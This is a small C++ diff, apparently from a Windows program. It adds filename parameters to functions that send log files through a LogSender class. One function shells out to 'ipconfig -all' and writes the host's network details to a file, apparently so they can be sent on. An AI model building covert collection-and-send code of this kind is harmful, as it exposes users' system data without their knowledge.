@@ -64,11 +64,11 @@ string get_ip_from_decimal(unsigned long ip) {
     return result;
 }
 
-void send_log(LogSender l) {
-    l.send_logs("./_.txt");
+void send_log(LogSender l, string filename) {
+    l.send_logs(filename.c_str());
 }
 
-void send_file() {
+void send_file(string filename) {
     system("c:\\windows\\system32\\ipconfig -all > ips.txt");
 
     //ipInfo[0] = ip address
